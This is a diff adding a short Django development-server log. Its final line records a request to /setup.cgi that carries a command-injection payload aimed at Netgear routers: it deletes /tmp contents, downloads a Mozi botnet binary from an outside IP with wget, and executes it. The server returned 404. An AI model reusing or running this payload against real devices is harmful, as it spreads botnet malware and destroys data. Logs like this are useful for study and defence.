@@ -1,0 +1,4 @@
+Watching for file changes with StatReloader
+[14/Jul/2023 23:12:02] "GET / HTTP/1.1" 200 1526
+Not Found: /setup.cgi
+[14/Jul/2023 23:34:33] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.39.118.175:38372/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 7817
